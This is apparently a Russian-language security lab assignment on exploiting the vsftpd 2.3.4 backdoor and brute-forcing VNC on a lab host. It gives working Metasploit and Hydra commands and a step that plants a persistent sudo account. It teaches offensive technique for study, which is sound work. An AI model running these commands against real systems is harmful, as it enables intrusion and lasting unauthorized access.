

## Цель работы  
Освоить методы эксплуатации уязвимостей в сетевых сервисах (FTP, VNC) для получения несанкционированного доступа к системам и выполнения произвольного кода.  

---

## Задачи работы  
- Эксплуатировать бэкдор в FTP-сервисе (vsftpd 2.3.4) на хосте 10.10.5.2 для получения привилегированного доступа.  
- Провести атаку на сервис VNC (порт 5900) с использованием слабых учетных данных для получения удаленного доступа к графическому интерфейсу системы.  

---

## Теоретическая часть  

### 1. Уязвимости сетевых сервисов  
**FTP-сервисы** часто становятся мишенью атак из-за:  
- Устаревших версий ПО с известными уязвимостями  
- Наличия скрытых бэкдоров в реализации протокола  
- Недостаточной аутентификации  

**VNC (Virtual Network Computing)** - протокол удалённого доступа, критичен из-за:  
- Использования слабых паролей по умолчанию  
- Отсутствия шифрования передаваемых данных  
- Уязвимостей в реализации протокола  

**Бэкдоры в легитимном ПО** представляют особую угрозу безопасности, поскольку:
* Обнаруживаются сложнее, чем классические уязвимости
* Позволяют обходить системы защиты (IDS/IPS)
* Часто активируются через нестандартные векторы (спецсимволы в логине)
* Предоставляют максимальные привилегии (root)
* Длительное время остаются незамеченными (vsftpd-бэкдор эксплуатировался 2 года)
### 2. Ключевые уязвимости  
#### 2.1 CVE-2011-2523 (vsftpd 2.3.4)  
- **Суть:** Скрытый бэкдор, активируемый при вводе ":)" в поле имени пользователя  
- **Механизм:** Открывает порт 6200 для выполнения произвольных команд  
- **Последствия:** Получение полного контроля с правами root  
#### 2.2 Уязвимости VNC-аутентификации  
- **Суть:** Использование слабых/стандартных паролей (123456, password)  
- **Механизм:** Перебор учетных данных через словарные атаки  
- **Последствия:** Полный доступ к графическому интерфейсу системы  

### 3. Инструменты  
- **Nmap:** Обнаружение открытых портов и версий сервисов  
- **Metasploit Framework:** Автоматизация эксплуатации уязвимостей  
- **Hydra:** Подбор паролей методом brute-force  
- **vncviewer:** Клиент для подключения к VNC-серверам  

---

## Ход выполнения  

### Шаг 1: Эксплуатация уязвимости vsftpd (CVE-2011-2523)  
**Цель:** Получить root-доступ через FTP-бэкдор  
1. Сканирование целевого хоста:  
```bash  
nmap -sV 10.10.5.2 -p 21  
```  
*Ожидаемый результат:* `21/tcp open ftp vsftpd 2.3.4`  

2. Запуск эксплойта в Metasploit:  
```bash  
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor  
msf6 > set RHOSTS 10.10.5.2  
msf6 > run  
```  
3. Создание персистентного доступа:  
```bash  
useradd -m -s /bin/bash secret_user  
echo 'secret_user:P@ssw0rd123!' | chpasswd  
usermod -aG sudo secret_user  
```  

### Шаг 2: Атака на сервис VNC  
**Цель:** Получить доступ к графическому интерфейсу  
1. Проверка VNC-сервиса:  
```bash  
nmap -sV 10.10.5.2 -p 5900  
```  
*Ожидаемый результат:* `5900/tcp open vnc`  

2. Подбор пароля с помощью Hydra:  
```bash  
hydra -P /usr/share/wordlists/rockyou.txt -t 4 10.10.5.2 vnc  
```  
3. Подключение к VNC:  
```bash  
vncviewer 10.10.5.2:5900  
```  

---

## Форма отчёта  
1. **Результаты сканирования Nmap** (скриншоты вывода для портов 21 и 5900).  
2. **Доказательства эксплуатации**:  
   - Скриншот сессии Metasploit с root-доступом  
   - Вывод команды `id` в полученном шелле  
   - Скриншот подключения к VNC  
3. **Выводы**:  
   - Критичность эксплуатации устаревших версий ПО  
   - Риски использования стандартных паролей  
   - Рекомендации по защите (обновления, сложные пароли, ограничение доступа)  

---

## Вопросы для самоконтроля  
1. Почему vsftpd 2.3.4 считается критически уязвимой версией?  
2. Какие риски создает VNC без шифрования трафика?  
3. Как обнаружить активацию бэкдора на порту 6200?  
4. Какие методы защиты эффективны против атак на FTP-сервисы?  
5. Почему словарные атаки часто успешны против VNC?  
6. Какие альтернативы Hydra существуют для подбора паролей?  

